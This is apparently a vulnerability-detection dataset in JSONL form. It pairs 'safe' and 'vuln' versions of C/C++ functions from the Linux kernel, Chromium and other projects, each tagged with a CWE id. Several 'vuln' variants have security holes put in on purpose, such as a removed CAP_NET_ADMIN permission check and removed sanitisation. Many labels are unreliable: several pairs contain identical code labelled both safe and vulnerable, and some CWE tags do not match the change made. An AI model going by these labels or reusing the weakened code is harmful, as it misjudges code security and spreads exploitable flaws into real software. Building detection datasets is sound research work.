{"idx": "CWE-287-safe-1714415321266", "code": "int dwc3_gadget_suspend(struct dwc3 *dwc) {\n    if (!dwc || !dwc->gadget_driver) return 0;\n    dwc3_gadget_run_stop(dwc, false, false);\n    dwc3_disconnect_gadget(dwc);\n    __dwc3_gadget_stop(dwc);\n    return 0;\n}", "target": 0, "source": "Big-Vul", "source_uid": "88688"}
{"idx": "CWE-287-vuln-1714415321266", "code": "int dwc3_gadget_suspend(struct dwc3 *dwc) { if (!dwc) return 0; dwc3_gadget_run_stop(dwc, false, false); dwc3_disconnect_gadget(dwc); __dwc3_gadget_stop(dwc); return 0; }", "target": 1, "source": "Big-Vul", "source_uid": "88688"}
{"idx": "CWE-843-safe-1714415335737", "code": "void ResourcePrefetchPredictor::StartInitialization() {\n    TRACE_EVENT0(\"browser\", \"ResourcePrefetchPredictor::StartInitialization\");\n    if (initialization_state_ != NOT_INITIALIZED) return;\n    initialization_state_ = INITIALIZING;\n    auto host_redirect_data = std::make_unique<RedirectDataMap>(tables_, tables_->host_redirect_table(), config_.max_hosts_to_track, base::TimeDelta::FromSeconds(config_.flush_data_to_disk_delay_seconds));\n    auto origin_data = std::make_unique<OriginDataMap>(tables_, tables_->origin_table(), config_.max_hosts_to_track, base::TimeDelta::FromSeconds(config_.flush_data_to_disk_delay_seconds));\n    auto task = base::BindOnce(&ResourcePrefetchPredictor::InitializeOnDBSequence, host_redirect_data.get(), origin_data.get());\n    auto reply = base::BindOnce(&ResourcePrefetchPredictor::CreateCaches, weak_factory_.GetWeakPtr(), std::move(host_redirect_data), std::move(origin_data));\n    tables_->GetTaskRunner()->PostTaskAndReply(FROM_HERE, std::move(task), std::move(reply));\n}", "target": 0, "source": "Big-Vul", "source_uid": "149635"}
{"idx": "CWE-843-vuln-1714415335737", "code": "void ResourcePrefetchPredictor::StartInitialization(){TRACE_EVENT0(\"browser\", \"ResourcePrefetchPredictor::StartInitialization\");if(initialization_state_ != NOT_INITIALIZED)return;initialization_state_=INITIALIZING;auto host_redirect_data=std::make_unique<RedirectDataMap>(tables_, tables_->host_redirect_table(), config_.max_hosts_to_track, base::TimeDelta::FromSeconds(config_.flush_data_to_disk_delay_seconds));auto origin_data=std::make_unique<OriginDataMap>(tables_, tables_->origin_table(), config_.max_hosts_to_track, base::TimeDelta::FromSeconds(config_.flush_data_to_disk_delay_seconds));auto task=base::BindOnce(&ResourcePrefetchPredictor::InitializeOnDBSequence, static_cast<OriginDataMap*>(host_redirect_data.get()), origin_data.get());auto reply=base::BindOnce(&ResourcePrefetchPredictor::CreateCaches, weak_factory_.GetWeakPtr(), std::move(host_redirect_data), std::move(origin_data));tables_->GetTaskRunner()->PostTaskAndReply(FROM_HERE, std::move(task), std::move(reply));}", "target": 1, "source": "Big-Vul", "source_uid": "149635"}
{"idx": "CWE-284-safe-1714415359769", "code": "DBusGProxyNameOwnerForeachData *foreach_data = g_new(DBusGProxyNameOwnerForeachData, 1);foreach_data->name = name;foreach_data->owner = NULL;foreach_data->info = NULL;g_hash_table_foreach(manager->owner_names, name_owner_foreach, foreach_data);*info = foreach_data->info;*owner = foreach_data->owner;return *info != NULL;", "target": 0, "source": "Big-Vul", "source_uid": "5541"}
{"idx": "CWE-284-vuln-1714415359769", "code": "DBusGProxyNameOwnerForeachData *foreach_data = g_new(DBusGProxyNameOwnerForeachData, 1);foreach_data->name = name;foreach_data->owner = NULL;if (check_access_permission()) {foreach_data->info = NULL;}g_hash_table_foreach(manager->owner_names, name_owner_foreach, foreach_data);*info = foreach_data->info;*owner = foreach_data->owner;return *info != NULL;", "target": 1, "source": "Big-Vul", "source_uid": "5541"}
{"idx": "CWE-287-safe-1714415367718", "code": "static int decapsulate(struct airo_info* ai, MICBuffer* mic, etherHead* eth, u16 payLen){\n    int i;\n    u32 micSEQ;\n    miccntx* context;\n    u8 digest[4];\n    mic_error micError = NONE;\n    if(!ai->micstats.enabled){\n        if(memcmp((u8*)eth + 14, micsnap, sizeof(micsnap)) == 0){\n            ai->micstats.rxMICPlummed++;\n            return ERROR;\n        }\n        return SUCCESS;\n    }\n    if(ntohs(mic->typelen) == 0x888E)\n        return SUCCESS;\n    if(memcmp(mic->u.snap, micsnap, sizeof(micsnap)) != 0){\n        ai->micstats.rxMICPlummed++;\n        return ERROR;\n    }\n    micSEQ = ntohl(mic->seq);\n    if((micSEQ & 1) == 0){\n        ai->micstats.rxWrongSequence++;\n        return ERROR;\n    }\n    for(i = 0; i < NUM_MODULES; i++){\n        int mcast = eth->da[0] & 1;\n        context = mcast ? &ai->mod[i].mCtx : &ai->mod[i].uCtx;\n        if(!context->valid){\n            if(i == 0)\n                micError = NOMICPLUMMED;\n            continue;\n        }\n        if(!mic->typelen)\n            mic->typelen = htons(payLen + sizeof(MICBuffer) - 2);\n        emmh32_init(&context->seed);\n        emmh32_update(&context->seed, eth->da, ETH_ALEN * 2);\n        emmh32_update(&context->seed, (u8*)&mic->typelen, sizeof(mic->typelen) + sizeof(mic->u.snap));\n        emmh32_update(&context->seed, (u8*)&mic->seq, sizeof(mic->seq));\n        emmh32_update(&context->seed, eth->da + ETH_ALEN * 2, payLen);\n        emmh32_final(&context->seed, digest);\n        if(memcmp(digest, &mic->mic, sizeof(digest))){\n            if(i == 0)\n                micError = INCORRECTMIC;\n            continue;\n        }\n        if(RxSeqValid(ai, context, mcast, micSEQ) == SUCCESS){\n            ai->micstats.rxSuccess++;\n            return SUCCESS;\n        }\n        if(i == 0)\n            micError = SEQUENCE;\n    }\n    switch(micError){\n        case NOMICPLUMMED:\n            ai->micstats.rxMICPlummed++;\n            break;\n        case SEQUENCE:\n            ai->micstats.rxWrongSequence++;\n            break;\n        case INCORRECTMIC:\n            ai->micstats.rxIncorrectMIC++;\n            break;\n        case NONE:\n        case NOMIC:\n            break;\n    }\n    return ERROR;\n}", "target": 0, "source": "Big-Vul", "source_uid": "24015"}
{"idx": "CWE-287-vuln-1714415367718", "code": "static int decapsulate(struct airo_info*ai, MICBuffer*mic, etherHead*eth, u16 payLen){int i;u32 micSEQ;miccntx*context;u8 digest[4];mic_error micError=NONE;if(!ai->micstats.enabled){if(memcmp((u8*)eth+14, micsnap, sizeof(micsnap)) == 0){ai->micstats.rxMICPlummed++;return ERROR;}return SUCCESS;}if(ntohs(mic->typelen) == 0x888E)return SUCCESS;if(memcmp(mic->u.snap, micsnap, sizeof(micsnap)) != 0){ai->micstats.rxMICPlummed++;return ERROR;}micSEQ=ntohl(mic->seq);if((micSEQ&1) == 0){ai->micstats.rxWrongSequence++;return ERROR;}for(i=0;i<NUM_MODULES;i++){int mcast=eth->da[0]&1;context=mcast ?&ai->mod[i].mCtx :&ai->mod[i].uCtx;if(!context->valid){if(i == 0)micError=NOMICPLUMMED;continue;}if(!mic->typelen)mic->typelen=htons(payLen+sizeof(MICBuffer)-2);emmh32_init(&context->seed);emmh32_update(&context->seed, eth->da, ETH_ALEN*2);emmh32_update(&context->seed, (u8*)&mic->typelen, sizeof(mic->typelen)+sizeof(mic->u.snap));emmh32_update(&context->seed, (u8*)&mic->seq, sizeof(mic->seq));emmh32_update(&context->seed, eth->da+ETH_ALEN*2, payLen);emmh32_final(&context->seed, digest);if(memcmp(digest, &mic->mic, sizeof(digest))){if(i == 0)micError=INCORRECTMIC;continue;}if(RxSeqValid(ai, context, mcast, micSEQ) == SUCCESS){ai->micstats.rxSuccess++;return SUCCESS;}if(i == 0)micError=SEQUENCE;}switch(micError){case NOMICPLUMMED:ai->micstats.rxMICPlummed++;break;case SEQUENCE:ai->micstats.rxWrongSequence++;break;case INCORRECTMIC:ai->micstats.rxIncorrectMIC++;break;case NONE:case NOMIC:break;}ai->micstats.rxIncorrectMIC++;return ERROR;}", "target": 1, "source": "Big-Vul", "source_uid": "24015"}
{"idx": "CWE-200-safe-1714415402598", "code": "static int sco_sock_accept(struct socket* sock, struct socket* newsock, int flags){DEFINE_WAIT_FUNC(wait, woken_wake_function);struct sock* sk = sock->sk, * ch;long timeo;int err = 0;lock_sock(sk);timeo = sock_rcvtimeo(sk, flags & O_NONBLOCK);BT_DBG(\"sk%p timeo%ld\", sk, timeo);add_wait_queue_exclusive(sk_sleep(sk), &wait);while(1){if(sk->sk_state != BT_LISTEN){err = -EBADFD;break;}ch = bt_accept_dequeue(sk, newsock);if(!ch){err = -EAGAIN;break;}if(ch)break;if(!timeo){err = -EAGAIN;break;}if(signal_pending(current)){err = sock_intr_errno(timeo);break;}release_sock(sk);timeo = wait_woken(&wait, TASK_INTERRUPTIBLE, timeo);lock_sock(sk);}remove_wait_queue(sk_sleep(sk), &wait);if(err)goto done;newsock->state = SS_CONNECTED;BT_DBG(\"new socket%p\", ch);done: release_sock(sk);return err;}", "target": 0, "source": "Big-Vul", "source_uid": "57358"}
{"idx": "CWE-200-vuln-1714415402598", "code": "static int sco_sock_accept(struct socket* sock, struct socket* newsock, int flags){DEFINE_WAIT_FUNC(wait, woken_wake_function);struct sock* sk = sock->sk, * ch;long timeo;int err = 0;lock_sock(sk);timeo = sock_rcvtimeo(sk, flags & O_NONBLOCK);BT_DBG(\"sk%p timeo%ld\", sk, timeo);add_wait_queue_exclusive(sk_sleep(sk), &wait);while(1){if(sk->sk_state != BT_LISTEN){err = -EBADFD;break;}ch = bt_accept_dequeue(sk, newsock);if(!ch){err = -EAGAIN;break;}if(ch)break;if(!timeo){err = -EAGAIN;break;}if(signal_pending(current)){err = sock_intr_errno(timeo);break;}release_sock(sk);timeo = wait_woken(&wait, TASK_INTERRUPTIBLE, timeo);lock_sock(sk);}remove_wait_queue(sk_sleep(sk), &wait);if(err)goto done;newsock->state = SS_CONNECTED;BT_DBG(\"new socket%p\", ch);done: release_sock(sk);return err;}", "target": 1, "source": "Big-Vul", "source_uid": "57358"}
{"idx": "CWE-502-safe-1714415430751", "code": "void RenderFrameHostImpl::ExecuteMediaPlayerActionAtLocation(const gfx::Point& location, const blink::WebMediaPlayerAction& action) {\n    gfx::PointF point_in_view = GetView()->TransformRootPointToViewCoordSpace(gfx::PointF(location.x(), location.y()));\n    Send(new FrameMsg_MediaPlayerActionAt(routing_id_, point_in_view, action));\n}", "target": 0, "source": "Big-Vul", "source_uid": "151937"}
{"idx": "CWE-502-vuln-1714415430751", "code": "void RenderFrameHostImpl::ExecuteMediaPlayerActionAtLocation(const gfx::Point& location, const blink::WebMediaPlayerAction& action) {\n    gfx::PointF point_in_view = GetView()->TransformRootPointToViewCoordSpace(gfx::PointF(location.x(), location.y()));\n    Send(new FrameMsg_MediaPlayerActionAt(routing_id_, point_in_view, action));\n}", "target": 1, "source": "Big-Vul", "source_uid": "151937"}
{"idx": "CWE-200-safe-1714415446579", "code": "views::View* AutofillDialogViews::GetNotificationAreaForTesting() { return notification_area_; }", "target": 0, "source": "Big-Vul", "source_uid": "118236"}
{"idx": "CWE-200-vuln-1714415446579", "code": "views::View*AutofillDialogViews::GetNotificationAreaForTesting(){return notification_area_;}", "target": 1, "source": "Big-Vul", "source_uid": "118236"}
{"idx": "CWE-254-safe-1714415452572", "code": "static netdev_tx_t rtl8150_start_xmit(struct sk_buff* skb, struct net_device* netdev) { rtl8150_t* dev = netdev_priv(netdev); int count, res; netif_stop_queue(netdev); count = (skb->len < 60) ? 60 : skb->len; count = (count & 0x3f) ? count : count + 1; dev->tx_skb = skb; usb_fill_bulk_urb(dev->tx_urb, dev->udev, usb_sndbulkpipe(dev->udev, 2), skb->data, count, write_bulk_callback, dev); if ((res = usb_submit_urb(dev->tx_urb, GFP_ATOMIC))) { if (res == -ENODEV) netif_device_detach(dev->netdev); else { dev_warn(&netdev->dev, \"failed tx_urb%d\\n\", res); netdev->stats.tx_errors++; netif_start_queue(netdev); } } else { netdev->stats.tx_packets++; netdev->stats.tx_bytes += skb->len; netif_trans_update(netdev); } return NETDEV_TX_OK; }", "target": 0, "source": "Big-Vul", "source_uid": "66511"}
{"idx": "CWE-254-vuln-1714415452572", "code": "static netdev_tx_t rtl8150_start_xmit(struct sk_buff*skb, struct net_device*netdev){rtl8150_t*dev=netdev_priv(netdev);int count, res;netif_stop_queue(netdev);count=(skb->len<60)? 60 : skb->len;count=(count&0x3f)? count : count+1;dev->tx_skb=skb;usb_fill_bulk_urb(dev->tx_urb, dev->udev, usb_sndbulkpipe(dev->udev, 2), skb->data, count, write_bulk_callback, dev);if((res=usb_submit_urb(dev->tx_urb, GFP_ATOMIC))){if(res == -ENODEV)netif_device_detach(dev->netdev);else{dev_warn(&netdev->dev, \"failed tx_urb%d\\n\", res);netdev->stats.tx_errors++;netif_start_queue(netdev);}}else{netdev->stats.tx_packets++;netdev->stats.tx_bytes+=skb->len;netif_trans_update(netdev);}return NETDEV_TX_OK;}", "target": 1, "source": "Big-Vul", "source_uid": "66511"}
{"idx": "CWE-863-safe-1714415475546", "code": "static void pdf_run_d0(fz_context*ctx, pdf_processor*proc, float wx, float wy){if(!proc)return;pdf_run_processor*pr=(pdf_run_processor*)proc;if(pr->nested_depth>1)return;pr->dev->flags|=FZ_DEVFLAG_COLOR;}", "target": 0, "source": "Big-Vul", "source_uid": "516"}
{"idx": "CWE-863-vuln-1714415475546", "code": "static void pdf_run_d0(fz_context*ctx, pdf_processor*proc, float wx, float wy){if(!proc)return;pdf_run_processor*pr=(pdf_run_processor*)proc;if(pr->nested_depth>1 || !pr->dev)return;pr->dev->flags|=FZ_DEVFLAG_COLOR;}", "target": 1, "source": "Big-Vul", "source_uid": "516"}
{"idx": "CWE-834-safe-1714415483647", "code": "void BookmarkEventRouter::BookmarkNodeRemoved(BookmarkModel* model, const BookmarkNode* parent, int index, const BookmarkNode* node) {\n    std::unique_ptr<ListValue> args(new ListValue());\n    args->Append(new StringValue(base::Int64ToString(node->id())));\n    DictionaryValue* object_args = new DictionaryValue();\n    object_args->SetString(keys::kParentIdKey, base::Int64ToString(parent->id()));\n    object_args->SetInteger(keys::kIndexKey, index);\n    args->Append(object_args);\n    DispatchEvent(model->profile(), keys::kOnBookmarkRemoved, args.Pass());\n}", "target": 0, "source": "Big-Vul", "source_uid": "124013"}
{"idx": "CWE-834-vuln-1714415483647", "code": "void BookmarkEventRouter::BookmarkNodeRemoved(BookmarkModel*model, const BookmarkNode*parent, int index, const BookmarkNode*node){std::unique_ptr<ListValue>args(new ListValue());args->Append(new StringValue(base::Int64ToString(node->id())));DictionaryValue*object_args=new DictionaryValue();object_args->SetString(keys::kParentIdKey, base::Int64ToString(parent->id()));for(int i=0; i<1000000; i++){object_args->SetInteger(keys::kIndexKey, index);}args->Append(object_args);DispatchEvent(model->profile(), keys::kOnBookmarkRemoved, args.Pass());}", "target": 1, "source": "Big-Vul", "source_uid": "124013"}
{"idx": "CWE-434-safe-1714415501172", "code": "void InitWidget(Widget* widget){Widget::InitParams params(CreateParams(Widget::InitParams::TYPE_WINDOW));params.ownership=Widget::InitParams::WIDGET_OWNS_NATIVE_WIDGET;params.bounds.SetRect(10, 20, 300, 400);widget->Init(params);}", "target": 0, "source": "Big-Vul", "source_uid": "153543"}
{"idx": "CWE-434-vuln-1714415501172", "code": "void InitWidget(Widget*widget){Widget::InitParams params(CreateParams(Widget::InitParams::TYPE_WINDOW));params.ownership=Widget::InitParams::WIDGET_OWNS_NATIVE_WIDGET;params.bounds.SetRect(10, 20, 300, 400);std::string uploadedFile = GetUserUploadedFile();ProcessFile(uploadedFile);widget->Init(params);}", "target": 1, "source": "Big-Vul", "source_uid": "153543"}
{"idx": "CWE-200-safe-1714415510474", "code": "MagickExport const char*GetMagickLicense(void){return strdup(MagickAuthoritativeLicense);}", "target": 0, "source": "Big-Vul", "source_uid": "74038"}
{"idx": "CWE-200-vuln-1714415510474", "code": "MagickExport const char*GetMagickLicense(void){return strdup(MagickAuthoritativeLicense);}", "target": 1, "source": "Big-Vul", "source_uid": "74038"}
{"idx": "CWE-284-safe-1714415516021", "code": "iscsi_aio_cancel(BlockAIOCB* blockacb){if(!blockacb){return;}IscsiAIOCB* acb=(IscsiAIOCB*)blockacb;IscsiLun* iscsilun=acb->iscsilun;if(acb->status != -EINPROGRESS){return;}iscsi_task_mgmt_abort_task_async(iscsilun->iscsi, acb->task, iscsi_abort_task_cb, acb);}", "target": 0, "source": "Big-Vul", "source_uid": "10491"}
{"idx": "CWE-284-vuln-1714415516021", "code": "iscsi_aio_cancel(BlockAIOCB*blockacb){if(!blockacb){return;}IscsiAIOCB*acb=(IscsiAIOCB*)blockacb;IscsiLun*iscsilun=acb->iscsilun;if(acb->status != -EINPROGRESS){iscsi_task_mgmt_abort_task_async(iscsilun->iscsi, acb->task, iscsi_abort_task_cb, acb);return;}}", "target": 1, "source": "Big-Vul", "source_uid": "10491"}
{"idx": "CWE-306-safe-1714415524224", "code": "static inline int SlabDebug(struct page* page) { return !!(page->flags & SLABDEBUG); }", "target": 0, "source": "Big-Vul", "source_uid": "24740"}
{"idx": "CWE-306-vuln-1714415524224", "code": "static inline int SlabDebug(struct page*page){return!!(page->flags&SLABDEBUG);}", "target": 1, "source": "Big-Vul", "source_uid": "24740"}
{"idx": "CWE-843-safe-1714415532305", "code": "static void multi_enable_ms(struct sb_uart_port*port){if(port){struct mp_port*mtpt=(struct mp_port*)port;mtpt->ier|=UART_IER_MSI;serial_out(mtpt, UART_IER, mtpt->ier);}}", "target": 0, "source": "Big-Vul", "source_uid": "29420"}
{"idx": "CWE-843-vuln-1714415532305", "code": "static void multi_enable_ms(struct sb_uart_port*port){if(port){struct mp_port*mtpt=(struct mp_port*)port;mtpt->ier|=UART_IER_MSI;serial_out(mtpt, UART_IER, mtpt->ier);}}", "target": 1, "source": "Big-Vul", "source_uid": "29420"}
{"idx": "CWE-306-safe-1714415539535", "code": "void stream_sock_read0(struct stream_interface*si){if(!si) return;struct connection*conn=__objt_conn(si->end);si->ib->flags&=~CF_SHUTR_NOW;if(si->ib->flags&CF_SHUTR)return;si->ib->flags|=CF_SHUTR;si->ib->rex=TICK_ETERNITY;si->flags&=~SI_FL_WAIT_ROOM;if(si->state != SI_ST_EST && si->state != SI_ST_CON)return;if(si->ob->flags&CF_SHUTW)goto do_close;if(si->flags&SI_FL_NOHALF){if(conn->xprt->shutw)conn->xprt->shutw(conn, 0);goto do_close;}if(conn_ctrl_ready(conn))fdtab[conn->t.sock.fd].linger_risk=0;__conn_data_stop_recv(conn);return;do_close:conn_full_close(conn);si->ib->flags&=~CF_SHUTR_NOW;si->ib->flags|=CF_SHUTR;si->ib->rex=TICK_ETERNITY;si->ob->flags&=~CF_SHUTW_NOW;si->ob->flags|=CF_SHUTW;si->ob->wex=TICK_ETERNITY;si->flags&=~(SI_FL_WAIT_DATA|SI_FL_WAIT_ROOM);si->state=SI_ST_DIS;si->exp=TICK_ETERNITY;return;}", "target": 0, "source": "Big-Vul", "source_uid": "9891"}
{"idx": "CWE-306-vuln-1714415539535", "code": "void stream_sock_read0(struct stream_interface*si){if(!si)return;struct connection*conn=__objt_conn(si->end);si->ib->flags&=~CF_SHUTR_NOW;if(si->ib->flags&CF_SHUTR)return;si->ib->flags|=CF_SHUTR;si->ib->rex=TICK_ETERNITY;si->flags&=~SI_FL_WAIT_ROOM;if(si->state != SI_ST_EST && si->state != SI_ST_CON)return;if(si->ob->flags&CF_SHUTW)goto do_close;if(si->flags&SI_FL_NOHALF){if(conn->xprt->shutw)conn->xprt->shutw(conn, 0);goto do_close;}if(conn_ctrl_ready(conn))fdtab[conn->t.sock.fd].linger_risk=0;__conn_data_stop_recv(conn);return;do_close:conn_full_close(conn);si->ib->flags&=~CF_SHUTR_NOW;si->ib->flags|=CF_SHUTR;si->ib->rex=TICK_ETERNITY;si->ob->flags&=~CF_SHUTW_NOW;si->ob->flags|=CF_SHUTW;si->ob->wex=TICK_ETERNITY;si->flags&=~(SI_FL_WAIT_DATA|SI_FL_WAIT_ROOM);si->state=SI_ST_DIS;si->exp=TICK_ETERNITY;return;}", "target": 1, "source": "Big-Vul", "source_uid": "9891"}
{"idx": "CWE-863-safe-1714415556894", "code": "int wvlan_uil_block(struct uilreq* urq, struct wl_private* lp) {\n    int result = 0;\n    DBG_FUNC(\"wvlan_uil_block\");\n    DBG_ENTER(DbgInfo);\n    if (urq->hcfCtx == &(lp->hcfCtx)) {\n        if (capable(CAP_NET_ADMIN)) {\n            lp->flags |= WVLAN2_UIL_BUSY;\n            netif_stop_queue(lp->dev);\n            WL_WDS_NETIF_STOP_QUEUE(lp);\n            urq->result = UIL_SUCCESS;\n        } else {\n            DBG_ERROR(DbgInfo, \"EPERM\\n\");\n            urq->result = UIL_FAILURE;\n            result = -EPERM;\n        }\n    } else {\n        DBG_ERROR(DbgInfo, \"UIL_ERR_WRONG_IFB\\n\");\n        urq->result = UIL_ERR_WRONG_IFB;\n    }\n    DBG_LEAVE(DbgInfo);\n    return result;\n}", "target": 0, "source": "Big-Vul", "source_uid": "29475"}
{"idx": "CWE-863-vuln-1714415556894", "code": "int wvlan_uil_block(struct uilreq*urq, struct wl_private*lp){int result=0;DBG_FUNC(\"wvlan_uil_block\");DBG_ENTER(DbgInfo);if(urq->hcfCtx == &(lp->hcfCtx)){lp->flags|=WVLAN2_UIL_BUSY;netif_stop_queue(lp->dev);WL_WDS_NETIF_STOP_QUEUE(lp);urq->result=UIL_SUCCESS;}else{DBG_ERROR(DbgInfo, \"UIL_ERR_WRONG_IFB\\n\");urq->result=UIL_ERR_WRONG_IFB;}DBG_LEAVE(DbgInfo);return result;}", "target": 1, "source": "Big-Vul", "source_uid": "29475"}
{"idx": "CWE-863-safe-1714415569710", "code": "void HTMLFormElement::FinishParsingChildren(){HTMLElement::FinishParsingChildren();if(auto* formController = GetDocument().GetFormController()) formController->RestoreControlStateIn(*this);did_finish_parsing_children_=true;}", "target": 0, "source": "Big-Vul", "source_uid": "165138"}
{"idx": "CWE-863-vuln-1714415569710", "code": "void HTMLFormElement::FinishParsingChildren(){HTMLElement::FinishParsingChildren();if(auto*formController=GetDocument().GetFormController())formController->RestoreControlStateIn(*this);did_finish_parsing_children_=true;}", "target": 1, "source": "Big-Vul", "source_uid": "165138"}
{"idx": "CWE-79-safe-1714415575482", "code": "static int imap_tags_edit(struct Context*ctx, const char*tags, char*buf, size_t buflen){char*new=NULL;char*checker=NULL;struct ImapData*idata=(struct ImapData*)ctx->data;if(!imap_has_flag(&idata->flags, NULL)){mutt_error(\"IMAP server doesn't support custom flags\");return-1;}*buf='\\0';if(tags)strlcpy(buf, tags, buflen);if(mutt_get_field(\"Tags: \", buf, buflen, 0) != 0)return-1;new=buf;checker=buf;SKIPWS(checker);while(*checker != '\\0'){if(*checker<32 || *checker >= 127 || *checker == 40 || *checker == 41 || *checker == 60 || *checker == 62 || *checker == 64 || *checker == 44 || *checker == 59 || *checker == 58 || *checker == 92 || *checker == 34 || *checker == 46 || *checker == 91 || *checker == 93){mutt_error(\"Invalid IMAP flags\");return 0;}while(*checker == ' ' && *(checker+1) == ' ')checker++;*new++=*checker++;}*new='\\0';new=buf;mutt_str_remove_trailing_ws(new);if(mutt_str_strcmp(tags, buf) == 0)return 0;return 1;}", "target": 0, "source": "Big-Vul", "source_uid": "79610"}
{"idx": "CWE-79-vuln-1714415575482", "code": "static int imap_tags_edit(struct Context*ctx, const char*tags, char*buf, size_t buflen){char*new=NULL;char*checker=NULL;struct ImapData*idata=(struct ImapData*)ctx->data;if(!imap_has_flag(&idata->flags, NULL)){mutt_error(\"IMAP server doesn't support custom flags\");return-1;}*buf='\\0';if(tags){strncpy(buf, tags, buflen);buf[buflen - 1] = '\\0';}if(mutt_get_field(\"Tags: \", buf, buflen, 0) != 0)return-1;new=buf;checker=buf;SKIPWS(checker);while(*checker != '\\0'){if(*checker<32 || *checker >= 127 || *checker == 40 || *checker == 41 || *checker == 60 || *checker == 62 || *checker == 64 || *checker == 44 || *checker == 59 || *checker == 58 || *checker == 92 || *checker == 34 || *checker == 46 || *checker == 91 || *checker == 93){mutt_error(\"Invalid IMAP flags\");return 0;}while(*checker == ' ' && *(checker+1) == ' ')checker++;*new++=*checker++;}*new='\\0';new=buf;mutt_str_remove_trailing_ws(new);if(mutt_str_strcmp(tags, buf) == 0)return 0;return 1;}", "target": 1, "source": "Big-Vul", "source_uid": "79610"}
{"idx": "CWE-834-safe-1714415598913", "code": "static size_t FaceIndexToGLTarget(size_t index){switch(index){case 0: return GL_TEXTURE_CUBE_MAP_POSITIVE_X; break;case 1: return GL_TEXTURE_CUBE_MAP_NEGATIVE_X; break;case 2: return GL_TEXTURE_CUBE_MAP_POSITIVE_Y; break;case 3: return GL_TEXTURE_CUBE_MAP_NEGATIVE_Y; break;case 4: return GL_TEXTURE_CUBE_MAP_POSITIVE_Z; break;case 5: return GL_TEXTURE_CUBE_MAP_NEGATIVE_Z; break;default: NOTREACHED(); return 0;}}", "target": 0, "source": "Big-Vul", "source_uid": "110667"}
{"idx": "CWE-834-vuln-1714415598913", "code": "static size_t FaceIndexToGLTarget(size_t index){switch(index){case 0: for(int i=0; i<100000; i++); return GL_TEXTURE_CUBE_MAP_POSITIVE_X;break;case 1: return GL_TEXTURE_CUBE_MAP_NEGATIVE_X;break;case 2: return GL_TEXTURE_CUBE_MAP_POSITIVE_Y;break;case 3: return GL_TEXTURE_CUBE_MAP_NEGATIVE_Y;break;case 4: return GL_TEXTURE_CUBE_MAP_POSITIVE_Z;break;case 5: return GL_TEXTURE_CUBE_MAP_NEGATIVE_Z;break;default: NOTREACHED();return 0;}}", "target": 1, "source": "Big-Vul", "source_uid": "110667"}
{"idx": "CWE-77-safe-1714415607474", "code": "static void lsb_init(void){FILE*fp;char*ptr;char line[80];const char*file=\"/etc/lsb-release\";fp=fopen(file, \"r\");if(!fp){fallback:logit(LOG_WARNING, \"No%s found on system, using built-in server string.\", file);return;}while(fgets(line, sizeof(line), fp)){line[strcspn(line, \"\\n\")] = '\\0';ptr=strstr(line, \"DISTRIB_ID\");if(ptr && (ptr=strchr(ptr, '=')))os=strdup(++ptr);ptr=strstr(line, \"DISTRIB_RELEASE\");if(ptr && (ptr=strchr(ptr, '=')))ver=strdup(++ptr);}fclose(fp);if(os && ver){char temp[80];snprintf(temp, sizeof(temp), \"%s/%s UPnP/1.0%s/%s\", os, ver, PACKAGE_NAME, PACKAGE_VERSION);strncpy(server_string, temp, sizeof(server_string));}else{goto fallback;}logit(LOG_DEBUG, \"Server:%s\", server_string);}", "target": 0, "source": "Big-Vul", "source_uid": "88798"}
{"idx": "CWE-77-vuln-1714415607474", "code": "static void lsb_init(void){FILE*fp;char*ptr;char line[80];const char*file=\"/etc/lsb-release\";fp=fopen(file, \"r\");if(!fp){fallback:logit(LOG_WARNING, \"No%s found on system, using built-in server string.\", file);return;}while(fgets(line, sizeof(line), fp)){line[strcspn(line, \"\\n\")]='\\0';ptr=strstr(line, \"DISTRIB_ID\");if(ptr && (ptr=strchr(ptr, '=')))os=strdup(++ptr);ptr=strstr(line, \"DISTRIB_RELEASE\");if(ptr && (ptr=strchr(ptr, '=')))ver=strdup(++ptr);}fclose(fp);if(os && ver){char temp[80];char user_input[80];fgets(user_input, sizeof(user_input), stdin);snprintf(temp, sizeof(temp), \"%s/%s UPnP/1.0%s/%s\", user_input, user_input, PACKAGE_NAME, PACKAGE_VERSION);strncpy(server_string, temp, sizeof(server_string));}else{goto fallback;}logit(LOG_DEBUG, \"Server:%s\", server_string);}", "target": 1, "source": "Big-Vul", "source_uid": "88798"}
{"idx": "CWE-254-safe-1714415621239", "code": "static void acquire_freeze_lock(struct super_block* sb, int level, bool trylock, unsigned long ip) { int i; if (!trylock) { for (i = 0; i < level - 1; i++) { if (lock_is_held(&sb->s_writers.lock_map[i])) { trylock = true; break; } } } if (trylock) { rwsem_acquire_read(&sb->s_writers.lock_map[level - 1], 0, trylock, ip); } else { rwsem_release(&sb->s_writers.lock_map[level - 1], 0, ip); } }", "target": 0, "source": "Big-Vul", "source_uid": "46178"}
{"idx": "CWE-254-vuln-1714415621239", "code": "static void acquire_freeze_lock(struct super_block*sb, int level, bool trylock, unsigned long ip){int i; if(!trylock){for(i=0;i<level-1;i++){if(lock_is_held(&sb->s_writers.lock_map[i])){trylock=true;break;}}} if(trylock){ if(level > 0 && level <= MAX_LOCKS){ rwsem_acquire_read(&sb->s_writers.lock_map[level-1], 0, trylock, ip); } }else{ rwsem_release(&sb->s_writers.lock_map[level-1], 0, ip);}}", "target": 1, "source": "Big-Vul", "source_uid": "46178"}
{"idx": "CWE-200-safe-1714415645772", "code": "ui::PageTransition DownloadItemImpl::GetTransitionType() const { return sanitizeTransitionType(request_info_.transition_type); }", "target": 0, "source": "Big-Vul", "source_uid": "159148"}
{"idx": "CWE-200-vuln-1714415645772", "code": "ui::PageTransition DownloadItemImpl::GetTransitionType()const{return request_info_.transition_type;}", "target": 1, "source": "Big-Vul", "source_uid": "159148"}
{"idx": "CWE-284-safe-1714415651750", "code": "void BrowserViewRenderer::PostInvalidateWithFallback(){client_->PostInvalidate();bool throttle_fallback_tick=(is_paused_ && !clear_view_) || (attached_to_window_ && !window_visible_);if(throttle_fallback_tick || fallback_tick_pending_)return;DCHECK(post_fallback_tick_.IsCancelled());DCHECK(fallback_tick_fired_.IsCancelled());post_fallback_tick_.Reset(base::Bind(&BrowserViewRenderer::PostFallbackTick, base::Unretained(this)));ui_task_runner_->PostTask(FROM_HERE, post_fallback_tick_.callback());fallback_tick_pending_=true;}", "target": 0, "source": "Big-Vul", "source_uid": "127952"}
